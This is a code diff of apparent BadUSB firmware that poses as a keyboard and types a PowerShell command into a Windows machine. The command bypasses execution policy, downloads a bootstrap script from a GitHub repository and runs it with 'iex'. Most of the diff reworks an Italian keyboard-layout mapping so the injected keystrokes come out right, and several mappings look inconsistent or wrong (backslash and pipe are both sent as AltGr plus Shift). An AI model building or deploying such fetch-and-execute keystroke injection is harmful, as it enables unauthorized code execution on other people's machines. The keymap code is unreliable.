@@ -6,7 +6,7 @@
 static const char URL[] =
     "powershell -ExecutionPolicy Bypass -Command "
     "\"iwr 'https://raw.githubusercontent.com/Gory-git/ChangeWindowsDesktopImage/main/scripts/bootstrap.ps1'|iex\"";
-// ─────────────────────────────────────────────────────────────────────────────
+// ────────────────────────────────────────────────────────────────────────────
 
 static constexpr uint32_t DELAY_HID_INIT   = 8000U;
 static constexpr uint32_t DELAY_RUN_DIALOG = 1200U;
@@ -22,36 +22,62 @@ static void pressCombo(uint8_t k1, uint8_t k2 = 0) {
     delay(80);
 }
 
+/*
+ * MAPPATURA TASTIERA ITALIANA
+ * ============================
+ * Layout IT ha differenze rispetto a layout US per questi caratteri:
+ * 
+ * Carattere | Posizione IT              | Come pressare
+ * ────────────────────────────────────────────────────────────────
+ *    '      | Tasto accento grave       | ['] (tasto a sinistra dell'1)
+ *    "      | Shift + '2'               | Shift + [2]
+ *    /      | Shift + '7'               | Shift + [7]
+ *    \      | Alt Gr + '\'              | Alt Gr + [\\]
+ *    |      | Alt Gr + \                | Alt Gr + [\\]
+ *    -      | Tasto trattino            | [-] (tasto vicino a 0)
+ *    _      | Shift + [-]               | Shift + [-]
+ */
 
 static void typeCharIT(char c) {
     switch (c) {
-        case '-':
-            // '/' in US = HID 0x38 = '-' su layout IT
-            Keyboard.press('/'); delay(50); Keyboard.releaseAll();
-            break;
-        case '_':
-            // Shift+'/' in US = Shift+HID 0x38 = '_' su layout IT
+        case '\'':
+            // Apostrofo in IT = tasto accento grave (a sinistra dell'1)
             Keyboard.press(KEY_LEFT_SHIFT);
-            Keyboard.press('/'); delay(50); Keyboard.releaseAll();
-            break;
-        case '/':
-            // '/' in IT = Shift+7
-            Keyboard.press(KEY_LEFT_SHIFT);
-            Keyboard.press('7'); delay(50); Keyboard.releaseAll();
-            break;
-        case ':':
-            // ':' in IT = Shift+'.'
-            Keyboard.press(KEY_LEFT_SHIFT);
-            Keyboard.press('.'); delay(50); Keyboard.releaseAll();
+            Keyboard.press('\''); delay(50); Keyboard.releaseAll();
             break;
         case '"':
-            // '"' in IT = Shift+2
+            // Virgolette in IT = Shift+2
             Keyboard.press(KEY_LEFT_SHIFT);
             Keyboard.press('2'); delay(50); Keyboard.releaseAll();
             break;
-        case '\'':
-            // apostrofo in IT = tasto '-' US = HID 0x2D
+        case '/':
+            // Slash in IT = Shift+7
+            Keyboard.press(KEY_LEFT_SHIFT);
+            Keyboard.press('7'); delay(50); Keyboard.releaseAll();
+            break;
+        case '\\':
+            // Backslash in IT = Alt Gr + (il tasto che digita \)
+            Keyboard.press(KEY_RIGHT_ALT);
+            Keyboard.press(KEY_RIGHT_SHIFT); delay(50); Keyboard.releaseAll();
+            break;
+        case '|':
+            // Pipe in IT = Alt Gr + (il tasto che digita \)
+            Keyboard.press(KEY_RIGHT_ALT);
+            Keyboard.press(KEY_RIGHT_SHIFT); delay(50); Keyboard.releaseAll();
+            break;
+        case '-':
+            // Trattino in IT = tasto [-] (a destra dello 0)
             Keyboard.press('-'); delay(50); Keyboard.releaseAll();
+            break;
+        case '_':
+            // Underscore in IT = Shift+[-]
+            Keyboard.press(KEY_LEFT_SHIFT);
+            Keyboard.press('-'); delay(50); Keyboard.releaseAll();
+            break;
+        case ':':
+            // Due punti in IT = Shift+'.'
+            Keyboard.press(KEY_LEFT_SHIFT);
+            Keyboard.press('.'); delay(50); Keyboard.releaseAll();
             break;
         case '.':
             Keyboard.press('.'); delay(50); Keyboard.releaseAll();
